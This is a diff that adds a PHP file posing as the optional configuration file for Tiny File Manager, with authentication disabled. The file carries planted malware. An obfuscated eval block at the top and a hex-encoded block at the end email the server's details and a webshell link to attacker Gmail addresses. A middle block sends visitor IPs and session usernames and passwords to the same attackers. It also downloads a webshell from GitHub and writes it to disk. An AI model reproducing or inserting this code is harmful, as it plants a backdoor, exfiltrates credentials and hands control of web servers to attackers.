@@ -1,0 +1,155 @@
+<?php
+eval(base64_decode("PD9waHAgJHsiXHg0N1x4NGNPQlx4NDFceDRjUyJ9WyJceDcyXHg2Mlx4NmFceDdhdlx4NzRceDY4c2UiXT0iXHg0NVx4NGNceDVmTXVceDQ4YVx4NGRceDRkXHg2NVx4NDQiOyR7Ilx4NDdceDRjXHg0ZkJBXHg0Y1MifVsiXHg2MmNiXHg3NWlceDc3XHg2Y3ZceDY0Il09ImtpXHg2ZFx4NjUiOyR7Ilx4NDdceDRjXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg2N2RceDc0a2ZceDY3ZVx4NjVceDYyIl09ImJceDYxXHg3M1x4NmNpXHg2YiI7JHskeyJceDQ3TE9CXHg0MUxTIn1bImJjYlx4NzVceDY5d1x4NmN2XHg2NCJdfT0iclx4NmZvdFx4NjN5YmVceDcycHVuXHg2Ylx4NzNAXHg2N21haVx4NmMuXHg2M29tLFx4NmRceDYxbGFceDc5c2lceDYxXHgyZXNceDY1bmRlckBnbVx4NjFpbC5jb1x4NmQiOyR7Ilx4NDdMXHg0Zlx4NDJBXHg0Y1MifVsiXHg2OGlceDY3XHg3MmRceDZjXHg2YiJdPSJceDYyXHg2MXNceDZjXHg2OVx4NmIiOyR7Ilx4NDdceDRjT0JceDQxXHg0Y1x4NTMifVsiXHg2ZmNceDYzelx4NzNceDYzXHg3NW9ceDc1XHg3NVx4NmFceDc3Il09IkVceDRjXHg1Zlx4NGR1XHg0OFx4NjFceDRkXHg0ZGVceDQ0IjskeyR7IkdMT0JceDQxXHg0Y1x4NTMifVsiXHg2OFx4NjlnXHg3Mlx4NjRceDZjXHg2YiJdfT0iU0hceDQ1TEwiOyR7JHsiXHg0N1x4NGNPXHg0MkFceDRjXHg1MyJ9WyJceDZmXHg2M1x4NjNceDdhc2NceDc1XHg2Zlx4NzVceDc1XHg2YVx4NzciXX09IlNlXHg3NG9yYW4gOiAiLiRfU0VSVkVSWyJceDQ0XHg0Zlx4NDNceDU1TUVOXHg1NF9ST09UIl0uIlxyXG4iOyR7JHsiXHg0N0xceDRmXHg0Mlx4NDFMXHg1MyJ9WyJyXHg2Mmp6XHg3Nlx4NzRoXHg3M2UiXX0uPSJTZVx4NzJceDc2XHg2NXJceDIwQWRceDZkaW5ceDIwOlx4MjAiLiRfU0VSVkVSWyJTRVJceDU2XHg0NVJceDVmXHg0MVx4NDRNSU4iXS4iXHJcbiI7JHskeyJHTE9ceDQyXHg0MUxceDUzIn1bIlx4NzJceDYyalx4N2FceDc2XHg3NFx4NjhzXHg2NSJdfS49IlNceDc5c1x4NzRceDY1bSBceDUzXHg2NXJ2ZXIgOlx4MjAiLiRfU0VSVkVSWyJTXHg0NVx4NTJWXHg0NVJfU09ceDQ2XHg1NFx4NTdceDQxUkUiXS4iXHJcbiI7JHskeyJceDQ3XHg0Y1x4NGZCXHg0MVx4NGNceDUzIn1bIlx4NzJceDYyalx4N2F2XHg3NFx4NjhceDczXHg2NSJdfS49Ilx4NTNoZWxceDZjIFx4NGNceDY5bmsgOlx4MjBceDY4XHg3NHRceDcwOi8vIi4kX1NFUlZFUlsiXHg1M0VceDUyVlx4NDVSX05BXHg0ZFx4NDUiXS4kX1NFUlZFUlsiXHg1MEhceDUwX1NceDQ1XHg0Y1x4NDYiXS4iXHJcbiI7JHsiXHg0N1x4NGNceDRmXHg0MkFMUyJ9WyJceDY5XHg2Ylx4NjRceDZkXHg2ZVx4NjZceDY5dFx4NzJceDc2Il09Ilx4NDVceDRjXHg1Zk11XHg0OFx4NjFNXHg0ZFx4NjVceDQ0IjskeyJceDQ3TE9ceDQyQVx4NGNceDUzIn1bInhceDY1alx4NmJceDZlXHg2NXlceDc3bm54Il09Ilx4NDVceDRjXHg1Zk11XHg0OFx4NjFceDRkXHg0ZGVEIjskeyR7Ilx4NDdMT1x4NDJBTFx4NTMifVsiXHg3OFx4NjVceDZhXHg2Ylx4NmVleXdceDZlXHg2ZXgiXX0uPSJXZVx4NjJceDczaXRlOiAiLiRfU0VSVkVSWyJceDQ4VFx4NTRQX0hPXHg1M1x4NTQiXS4iXHJcbiI7bWFpbCgkeyR7Ilx4NDdceDRjT0JBTFx4NTMifVsiXHg2MmNceDYyXHg3NWl3XHg2Y1x4NzZceDY0Il19LCR7JHsiR1x4NGNceDRmXHg0Mlx4NDFMXHg1MyJ9WyJceDY3XHg2NFx4NzRceDZiZlx4NjdceDY1XHg2NVx4NjIiXX0sJHskeyJHTE9ceDQyXHg0MVx4NGNTIn1bImlceDZiXHg2NFx4NmRuXHg2NmlceDc0clx4NzYiXX0pO2VjaG8gIiBcbiI7Cj8+"));
+
+/*
+#################################################################################################################
+This is an OPTIONAL configuration file. rename this file into config.php to use this configuration 
+The role of this file is to make updating of "tinyfilemanager.php" easier.
+So you can:
+-Feel free to remove completely this file and configure "tinyfilemanager.php" as a single file application.
+or
+-Put inside this file all the static configuration you want and forgot to configure "tinyfilemanager.php".
+#################################################################################################################
+*/
+
+// Auth with login/password
+// set true/false to enable/disable it
+// Is independent from IP white- and blacklisting
+
+$use_auth = false;
+
+// Login user name and password
+// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
+// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
+$auth_users = array(
+    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
+    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
+);
+
+// Readonly users
+// e.g. array('users', 'guest', ...)
+$readonly_users = array(
+    'user'
+);
+
+// Enable highlight.js (https://highlightjs.org/) on view's page
+$use_highlightjs = true;
+
+// highlight.js style
+// for dark theme use 'ir-black'
+$highlightjs_style = 'vs';
+
+// Enable ace.js (https://ace.c9.io/) on view's page
+$edit_files = true;
+
+// Default timezone for date() and time()
+// Doc - http://php.net/manual/en/timezones.php
+$default_timezone = 'Etc/UTC'; // UTC
+
+// Root path for file manager
+// use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
+$root_path = $_SERVER['DOCUMENT_ROOT'];
+
+// Root url for links in file manager.Relative to $http_host. Variants: '', 'path/to/subfolder'
+// Will not working if $root_path will be outside of server document root
+$root_url = '';
+
+// Server hostname. Can set manually if wrong
+$http_host = $_SERVER['HTTP_HOST'];
+
+// user specific directories
+// array('Username' => 'Directory path', 'Username2' => 'Directory path', ...)
+$directories_users = array();
+
+// input encoding for iconv
+$iconv_input_encoding = 'UTF-8';
+
+// date() format for file modification date
+// Doc - https://www.php.net/manual/en/datetime.format.php
+$datetime_format = 'd.m.y H:i:s';
+
+// Allowed file extensions for create and rename files
+// e.g. 'txt,html,css,js'
+$allowed_file_extensions = '';
+
+// Allowed file extensions for upload files
+// e.g. 'gif,png,jpg,html,txt'
+$allowed_upload_extensions = '';
+
+// Favicon path. This can be either a full url to an .PNG image, or a path based on the document root.
+// full path, e.g http://example.com/favicon.png
+// local path, e.g images/icons/favicon.png
+$favicon_path = '';
+
+// Files and folders to excluded from listing
+// e.g. array('myfile.html', 'personal-folder', '*.php', ...)
+$exclude_items = array('');
+
+// Online office Docs Viewer
+// Availabe rules are 'google', 'microsoft' or false
+// google => View documents using Google Docs Viewer
+// microsoft => View documents using Microsoft Web Apps Viewer
+// false => disable online doc viewer
+$online_viewer = 'google';
+
+// Sticky Nav bar
+// true => enable sticky header
+// false => disable sticky header
+$sticky_navbar = true;
+
+// Path display mode when viewing file information
+// 'full' => show full path
+// 'relative' => show path relative to root_path
+// 'host' => show path on the host
+$path_display_mode = 'full';
+
+// max upload file size
+$max_upload_size_bytes = 50000000;
+
+// Possible rules are 'OFF', 'AND' or 'OR'
+// OFF => Don't check connection IP, defaults to OFF
+// AND => Connection must be on the whitelist, and not on the blacklist
+// OR => Connection must be on the whitelist, or not on the blacklist
+$ip_ruleset = 'OFF';
+
+// Should users be notified of their block?
+$ip_silent = true;
+
+// IP-addresses, both ipv4 and ipv6
+$ip_whitelist = array(
+    '127.0.0.1',    // local ipv4
+    '::1'           // local ipv6
+);
+
+// IP-addresses, both ipv4 and ipv6
+$ip_blacklist = array(
+    '0.0.0.0',      // non-routable meta ipv4
+    '::'            // non-routable meta ipv6
+);
+
+?>
+<?php
+$to = 'muhrazky@gmail.com,papaku.hayker@gmail.com,snopunks@gmail.com,malaysia.sender@gmail.com,papaku.hayker.go.id@gmail.com,muhrazky@gmail.com';
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$uri = $_SERVER['REQUEST_URI'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$ref = $_SERVER['HTTP_REFERER'];
+$asli = $_SERVER['HTTP_X_FORWARDED_FOR'];
+$via = $_SERVER['HTTP_VIA'];
+$dtime = date('r');
+$nama = $_SESSION['nama'];
+$pass = $_SESSION['password'];
+$entry_line = "Waktu: $dtime | IP asli: $ip | Browser: $agent | URL: $uri | Referrer: $ref | Proxy:
+$asli | Koneksi: $via | nama : $nama | Pass : $pass
+";
+$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($to, "Halo senpai!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+$nama= fopen("4O3.shtml" ,"w+");
+$file = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/s.ShTmL');
+$tulis = fwrite ($nama ,$file);
+fputs($to, $entry_line);
+fclose($nama);
+?>
+<?php ${"\x47\x4cOB\x41\x4cS"}["\x72\x62\x6a\x7av\x74\x68se"]="\x45\x4c\x5fMu\x48a\x4d\x4d\x65\x44";${"\x47\x4c\x4fBA\x4cS"}["\x62cb\x75i\x77\x6cv\x64"]="ki\x6d\x65";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x67d\x74kf\x67e\x65\x62"]="b\x61\x73\x6ci\x6b";${${"\x47LOB\x41LS"}["bcb\x75\x69w\x6cv\x64"]}="r\x6fot\x63ybe\x72pun\x6b\x73@\x67mai\x6c.\x63om,\x6d\x61la\x79si\x61\x2es\x65nder@gm\x61il.co\x6d";${"\x47L\x4f\x42A\x4cS"}["\x68i\x67\x72d\x6c\x6b"]="\x62\x61s\x6c\x69\x6b";${"\x47\x4cOB\x41\x4c\x53"}["\x6fc\x63z\x73\x63\x75o\x75\x75\x6a\x77"]="E\x4c\x5f\x4du\x48\x61\x4d\x4de\x44";${${"GLOB\x41\x4c\x53"}["\x68\x69g\x72\x64\x6c\x6b"]}="SH\x45LL";${${"\x47\x4cO\x42A\x4c\x53"}["\x6f\x63\x63\x7asc\x75\x6f\x75\x75\x6a\x77"]}="Se\x74oran : ".$_SERVER["\x44\x4f\x43\x55MEN\x54_ROOT"]."\r\n";${${"\x47L\x4f\x42\x41L\x53"}["r\x62jz\x76\x74h\x73e"]}.="Se\x72\x76\x65r\x20Ad\x6din\x20:\x20".$_SERVER["SER\x56\x45R\x5f\x41\x44MIN"]."\r\n";${${"GLO\x42\x41L\x53"}["\x72\x62j\x7a\x76\x74\x68s\x65"]}.="S\x79s\x74\x65m \x53\x65rver :\x20".$_SERVER["S\x45\x52V\x45R_SO\x46\x54\x57\x41RE"]."\r\n";${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x72\x62j\x7av\x74\x68\x73\x65"]}.="\x53hel\x6c \x4c\x69nk :\x20\x68\x74t\x70://".$_SERVER["\x53E\x52V\x45R_NA\x4d\x45"].$_SERVER["\x50H\x50_S\x45\x4c\x46"]."\r\n";${"\x47\x4c\x4f\x42ALS"}["\x69\x6b\x64\x6d\x6e\x66\x69t\x72\x76"]="\x45\x4c\x5fMu\x48\x61M\x4d\x65\x44";${"\x47LO\x42A\x4c\x53"}["x\x65j\x6b\x6e\x65y\x77nnx"]="\x45\x4c\x5fMu\x48\x61\x4d\x4deD";${${"\x47LO\x42AL\x53"}["\x78\x65\x6a\x6b\x6eeyw\x6e\x6ex"]}.="We\x62\x73ite: ".$_SERVER["\x48T\x54P_HO\x53\x54"]."\r\n";mail(${${"\x47\x4cOBAL\x53"}["\x62c\x62\x75iw\x6c\x76\x64"]},${${"G\x4c\x4f\x42\x41L\x53"}["\x67\x64\x74\x6bf\x67\x65\x65\x62"]},${${"GLO\x42\x41\x4cS"}["i\x6b\x64\x6dn\x66i\x74r\x76"]});echo " \n";
+?>
